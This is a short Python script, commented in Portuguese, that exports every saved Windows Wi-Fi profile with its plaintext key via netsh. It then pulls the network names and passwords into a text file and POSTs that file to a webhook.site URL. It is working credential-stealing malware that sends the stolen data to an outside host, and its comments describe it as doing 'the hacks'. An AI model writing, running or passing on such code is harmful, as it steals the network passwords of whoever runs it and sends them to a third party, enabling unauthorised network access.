import subprocess
import os
import sys 
import requests

#URL pra armazenar os dados virtualmente
url = 'https://webhook.site/c54afe1b-b19d-41b6-bca0-a318153297f2'

# criando o arquivo txt pra armazenar as senhas.
password_file = open('passwords.txt', "w")
password_file.write("Senha capturada: \n")
password_file.close()

# listas vazias que serão preenchidas com senha e nome da rede.
wifi_files = []
wifi_name = []
wifi_password = []


# cada vírgula é um espaço no cmd.
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output= True).stdout.decode('Windows-1251')


#pegar o diretório atual
path = os.getcwd()

# realizar os hacks
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("passwords.txt", "a")
                            print("SSID: " +x, "Password: " +y, sep='\n')
                            sys.stdout.close()

# mandar os hacks
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)

